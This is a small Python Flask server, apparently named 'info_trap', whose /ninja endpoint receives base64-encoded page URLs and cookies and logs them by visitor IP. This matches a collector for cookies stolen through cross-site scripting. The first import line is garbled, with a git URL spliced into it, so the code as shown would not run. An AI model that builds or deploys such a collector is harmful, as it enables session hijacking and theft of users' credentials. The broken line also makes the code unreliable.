from flagit@github.com:Ultrae/info_trap.gitsk import Flask
from flask import request
import sys
import base64
import json
import os

app = Flask(__name__)


@app.route('/')
def hello_world():
    return 'Hello World!'


@app.route('/ninja', methods=['POST', 'GET'])
def ninja():
    error = None
    if request.method == 'GET':
        f = base64.b64decode(request.args.get('url')).decode('ascii')
        c = base64.b64decode(request.args.get('cookie')).decode('ascii')

        print(f, file=sys.stdout)
        print(c, file=sys.stdout)

        data = {}
        with open('/home/ultrae/FLASK_TEST/here.json', "r") as file:
            if os.stat('/home/ultrae/FLASK_TEST/here.json').st_size != 0:
                data = json.load(file)

        with open('/home/ultrae/FLASK_TEST/here.json', "w") as file:
            if not request.remote_addr in data:
                data[request.remote_addr] = [
                    {"url": f, "cookies": c.strip(";")}]
            else:
                data[request.remote_addr].append(
                    {"url": f, "cookies": c.strip(";")})
            json.dump(data, file)

        return 'GET'

    if request.method == 'POST':
        f = request.data
        f = f.decode('ascii')
        with open('/home/ultrae/FLASK_TEST/here', "a") as file:
            file.write(f + " " + request.remote_addr + '\n')
        return 'POST'

    return 'error'


if __name__ == '__main__':
    app.run()
